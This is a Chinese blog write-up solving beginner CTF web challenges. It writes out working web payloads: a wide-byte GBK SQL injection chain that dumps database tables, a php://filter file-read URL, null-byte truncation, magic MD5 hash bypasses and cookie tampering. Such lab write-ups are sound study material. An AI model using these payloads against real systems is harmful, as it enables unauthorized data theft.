---
title: "CG CTF Web #1"
date: 2020-02-07T15:47:52+08:00
tags:
  - CTF
  - Web
categories: Penetration
---

## 0x00 [签到题](http://chinalover.sinaapp.com/web1/)

浏览器中按 F12 查看网页元素即可获得 Flag。



## 0x01 [md5 collision](http://chinalover.sinaapp.com/web19/)

给出了源码

```php
$md51 = md5('QNKCDZO');
$a = @$_GET['a'];
$md52 = @md5($a);
if(isset($a)){
if ($a != 'QNKCDZO' && $md51 == $md52) {
    echo "nctf{*****************}";
} else {
    echo "false!!!";
}}
else{echo "please input a";}
```

可以看到后台先获取了参数 `a`,然后分别对 `QNKCDZO` 和 `a` 进行了 MD5 加密， 然后对比两者的 MD5 值，但是 `a` 不能和他给出的字符串相等。先尝试对题目给出的字符串进行 MD5 加密，32 位结果为 `0e830400451993494058024219903391`，发现是一个科学计数法的表示方式， 0 的任意次方等于 0 ， 因此只要找到其他 MD5 值为 0eXXXXXXXXX 格式的字符串即可。
通过查找资料发现以下字符串

| 字符串       | MD5                              |
| ------------ | -------------------------------- |
| QNKCDZO      | 0e830400451993494058024219903391 |
| s878926199a  | 0e545993274517709034328855841020 |
| s155964671a  | 0e342768416822451524974117254469 |
| s214587387a  | 0e848240448830537924465865611904 |
| s214587387a  | 0e848240448830537924465865611904 |
| s878926199a  | 0e545993274517709034328855841020 |
| s1091221200a | 0e940624217856561557816327384675 |

将参数附在 URL 后面， 构造 http://chinalover.sinaapp.com/web19/?a=s878926199a , 成功获得 Flag。

## 0x02 [签到 2](http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php)

需要输入下面的 zhimakaimen ，发现输入 10 个字符后就无法输入了，查看网页元素，修改 maxlength 属性值即可。

## 0x03 [这题不是 WEB](http://chinalover.sinaapp.com/web2/index.html)

一进入网页就看到一张动图，下载下来修改格式为 txt ，用文本工具打开后在末尾找到了 Flag。

## 0x04 [层层递进](http://chinalover.sinaapp.com/web3/)

在网页元素中找到本网址下的文件 SO.html ,打开后找到 S0.html ,打开后找到 404.html 。在最后一个网页的注释中找到 Flag， 这个题目的名字就是提示。

## 0x05 [AAencode](http://homura.cc/CGfiles/aaencode.txt)

> jjencode 将 JS 代码转换成只有符号的字符串
>
> aaencode 将 JS 代码转换成常用的网络表情

浏览器解析出来的字符会出现编码问题，将网页保存为 txt 然后放到浏览器的控制台中运行，即可获得 Flag 。

## 0x06 [单身二十年](http://chinalover.sinaapp.com/web8/)

看到题目描述的手速就想到跳转或者刷新页面之类的功能，果然页面从 `./search_key.php` 跳转到了 `./no_key_is_here_forever.php` 。在本地终端输入
`curl http://chinalover.sinaapp.com/web8/search_key.php`
即可获取该网页的内容。
`<script>window.location="./no_key_is_here_forever.php"; </script>`

## 0x07 php decode

题目给出了一段代码

```php
<?php
function CLsI($ZzvSWE) {

    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));

    for ($i = 0; $i < strlen($ZzvSWE); $i++) {

        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1);

    }

    return $ZzvSWE;

}
eval(CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="));
?>
```

直接运行报错，将 eval 改为 echo 之后输出结果

## 0x08 [文件包含](http://4.chinalover.sinaapp.com/web7/index.php)

使用 `php://filter` 构建 URL

`http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php`

读取源文件内容。对其进行 base64 解密后可以在注释中找到 Flag。

参考：

- https://blog.csdn.net/zz_Caleb/article/details/84193092
- https://www.freebuf.com/articles/web/182280.html

## 0x09 [单身一百年也没用](http://chinalover.sinaapp.com/web9/)

和前面的题目一样，先尝试 curl 获取网页内容，返回为空。使用 curl -I 查看报文头部信息，找到 Flag，Flag 告诉我们，这是 302 重定向。

## 0x0A [Download~!](http://way.nuptzj.cn/web6/)

访问不了啊啊啊

## 0x0B [COOKIE](http://chinalover.sinaapp.com/web10/index.php)

使用 BurpSuite 抓包，将请求报文中 Cookie: Login=0 改为 1 即可。

## 0x0C [MYSQL](http://chinalover.sinaapp.com/web11/)

进入网站体提醒我们查看 robots.txt ，内容为

```php
别太开心，flag不在这，这个文件的用途你看完了？
在CTF比赛中，这个文件往往存放着提示信息

TIP:sql.php

<?php
if($_GET[id]) {
   mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
  mysql_select_db(SAE_MYSQL_DB);
  $id = intval($_GET[id]);
  $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
  if ($_GET[id]==1024) {
      echo "<p>no! try again</p>";
  }
  else{
    echo($query[content]);
  }
}
?>
```

根据代码内容可知文件名 sql.php ， id 不能等于 1024，说明 id 等于 1024 的记录即答案， 发现前面有 intval 函数，输入 id = 1024.1 即可获得 Flag。

## 0x0D [GBK Injection](http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1)

参考： http://www.2cto.com/article/201209/153283.html

提示： your sql:select id,title from news where id = 1'

输入引号发现被转义为 \' 的格式，构造 %fe%27 后变为 %fe%5c %27 的格式，即可闭合前面的参数。

1. 构造 `index.php?id=1%fe%27and%201=1%23`

   正常返回。

2. 构造 `index.php?id=1%fe%27order%20by%202%23`

   确定字段数为 2，这里其实可以通过页面上的 select 语句直接确定。

3. 构造 `index.php?id=1%fe%27and%201=2%20%20union%20select%201,2%23`

   返回的是第二个字段即 title 字段。

4. 构造 `index.php?id=1%fe%27and%201=2%20%20union%20select%201,database()%23`

   爆数据库名，为 sae-chinalover

5. 构造 `index.php?id=1%fe%27and%201=2%20%20union%20select%201,version()%23`

   获取数据库版本 5.5.52-0ubuntu0.14.04.1

6. 构造 `index.php?id=1%fe%27and%201=2%20%20union%20select%201,ord(mid(user(),1,1))%23`

   用户名为 sae-chinalover@123.125.23.211

7. 构造 `index.php?id=1%fe%27and%201=2%20%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x7361652d6368696e616c6f766572%23`

   得到表名 ctf,ctf2,ctf3,ctf4,gbksqli,news

8. 构造 `index.php?id=1%fe%27and%201=2%20%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x637466%23`

   | 列名    | 字段 1 | 字段 2  | 字段 3 |
   | ------- | ------ | ------- | ------ |
   | ctf     | user   | pw      |
   | ctf2    | id     | content |
   | ctf3    | id     | email   | token  |
   | ctf4    |        |         |
   | gkbsqli | flag   |         |

找了半天。。终于找到 flag 了

9.  构造 `index.php?id=1%fe%27and%201=2%20%20union%20select%201,flag%20from%20gbksqli%23`

    获得 Flag

其实这里用 sqlmap 会快很多，不必自己一个一个去试。但是最后 flag 提交失败，可能又出了问题。

## 0x0E [/x00](http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php)

题目先给出了源代码如下

```php
if (isset ($_GET['nctf'])) {
    if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE)
        echo '必须输入数字才行';
    else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)
        die('Flag: '.$flag);
    else
        echo '骚年，继续努力吧啊~';
}
```

查找字符串 '#biubiubiu' 在参数中第一次出现的位置，且必须出现，但是参数又必须是数字。根据题目的提示进行字符串截断。

构造 `index.php?nctf=1%00%23biubiubiu` 即可。

因为题目说解法不止一种，接下来给出通过报错达到 满足 `@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE` 和 `strpos ($_GET['nctf'], '#biubiubiu') !== FALSE` 的目的。

`nctf[]=#biubiubiu` 可以通过传递数组的方式使程序报错。

## 0x0F [bypass again](http://chinalover.sinaapp.com/web17/index.php)

给出了以下代码

```php
if (isset($_GET['a']) and isset($_GET['b'])) {
    if ($_GET['a'] != $_GET['b'])
        if (md5($_GET['a']) == md5($_GET['b']))
            die('Flag: '.$flag);
        else
        print 'Wrong.';
}
```

参数 a 和参数 b 不能相等，但 MD5 值要相等，和之前的题目一样,不细写了。

未完待续。。
